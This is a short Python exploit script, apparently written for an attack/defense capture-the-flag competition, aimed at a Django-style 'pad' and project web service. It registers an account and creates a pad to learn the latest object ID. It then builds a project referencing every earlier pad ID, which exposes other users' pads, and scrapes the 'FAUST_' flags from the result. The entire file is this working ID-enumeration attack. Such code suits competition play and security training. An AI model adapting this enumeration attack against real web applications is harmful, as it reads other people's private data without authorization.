#!/usr/bin/python3

import requests
import sys
import json
import logging
import re

from utils import *



ip = None

def _register(session=None):
        if session is None:
            session = requests.session()

        r1 = session.get('http://[%(ip)s]:12345/accounts/register' % {'ip': ip})
        username = generate_username()
        password = generate_password()
        r2 = session.post('http://[%(ip)s]:12345/accounts/register' % {'ip': ip},
                          data={'username': username,
                                'password1': password,
                                'password2': password,
                                'csrfmiddlewaretoken': session.cookies['csrftoken']},
                          allow_redirects=False)

        if r2.status_code != 302:
            logging.error("%s %s" % (r2.url, r2.text))
            raise CheckerException(checkerlib.CheckResult.FAULTY)

        logging.debug("%s %s" % (r2.url, r2.text))
        return username, password


def _login(session, username, password):
        if session is None:
            session = requests.session()

        r1 = session.get('http://[%(ip)s]:12345/accounts/login' % {'ip': ip})
        r2 = session.post('http://[%(ip)s]:12345/accounts/login/' % {'ip': ip},
                          data={'username': username,
                                'password': password,
                                'csrfmiddlewaretoken': r1.cookies['csrftoken']},
                          allow_redirects=False)

        if r2.status_code == 200:
            logging.error("Login Failed: %s %s %d" % (r2.url, r2.text, r2.status_code))
            raise CheckerException(status=checkerlib.CheckResult.FLAG_NOT_FOUND)

        if r2.status_code != 302:
            logging.error("%s %s %d" % (r2.url, r2.text, r2.status_code))
            raise CheckerException(status=checkerlib.CheckResult.DOWN)

        logging.debug("%s %s" % (r2.url, r2.text))



def _get_pad(session, content):
    r = session.post('http://[%(ip)s]:12345/p/create/pad' % {'ip': ip},
                     data=json.dumps({'name': content}),
                     headers={'X-CSRFToken': session.cookies['csrftoken']},
                     allow_redirects=False
    )

    return r.json()


def _create_project(session, pks):
        r1 = session.get('http://[%(ip)s]:12345/p/create' % {'ip': ip})


        r2 = session.post('http://[%(ip)s]:12345/p/create/' % {'ip': ip},
                          data={'title': 'My Awesome Mars Research',
                                'people': json.dumps([]),
                                'pad': json.dumps(pks),
                                'csrfmiddlewaretoken': r1.cookies['csrftoken']},
                          allow_redirects=False)

        if r2.status_code != 302:
            logging.error("%s %s %d" % (r2.url, r2.text, r2.status_code))
            raise CheckerException(status=checkerlib.CheckResult.DOWN)

        logging.info("%s %s" % (r2.url, r2.text))
        return r2.next.url


def main():
    global ip
    ip = sys.argv[1]

    s = requests.session()
    u,p = _register(s)
    data = _get_pad(s, 'H4XxX0r')

    proj = _create_project(s, list(range(1, data['pk'])))
    d = s.get(proj)

    for loc in re.findall(r'FAUST_[A-Za-z0-9/\\+]{32}', d.text):
        print(loc)


if __name__ == '__main__':
    main()
